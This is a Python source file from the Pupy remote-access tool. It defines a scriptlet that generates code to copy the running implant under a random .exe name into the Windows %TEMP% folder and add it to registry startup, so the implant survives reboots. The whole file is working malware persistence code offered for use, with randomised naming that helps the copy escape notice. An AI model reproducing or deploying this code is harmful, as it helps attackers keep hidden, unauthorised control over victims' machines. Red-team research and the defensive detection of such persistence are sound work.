#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
import textwrap, random
from scriptlets import *

class ScriptletGenerator(Scriptlet):
	""" copy the current pupy executable to a random exe in %TEMP% and add persistency through registry """
	dependencies=[("windows/all/pupwinutils/persistence.py","pupwinutils.persistence")]
	def generate(self):
		return textwrap.dedent("""
		import sys, shutil, os.path, random, string
		if sys.platform=="win32":
			import pupwinutils.persistence
			random.seed({})
			name=''.join(random.choice(string.ascii_lowercase) for _ in range(0,7))+".exe"
			path=os.path.join(os.path.expandvars("%TEMP%"), name)
			shutil.copy(sys.executable, path)
			pupwinutils.persistence.add_registry_startup(path)
		""".format(int(random.getrandbits(32))))


